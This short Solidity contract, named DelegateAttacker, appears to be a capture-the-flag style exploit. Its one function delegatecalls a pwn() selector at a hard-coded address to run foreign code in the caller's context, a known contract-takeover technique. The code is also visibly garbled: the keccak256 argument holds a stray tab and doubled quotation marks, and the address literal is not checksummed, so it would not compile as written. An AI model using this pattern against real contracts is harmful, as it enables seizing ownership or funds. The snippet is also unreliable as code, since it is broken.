pragma solidity ^0.8.0;
contract DelegateAttacker {
    address public delegate = 0xa16e02e87b7454126e5e10d957a927a7f5b5d2be;

    function callPwn() public {
        (bool result,) = delegate.delegatecall(abi.encodeWithSelector(bytes4(keccak256("	"pwn()""))));
        require(result, "Call to pwn failed");
    }
}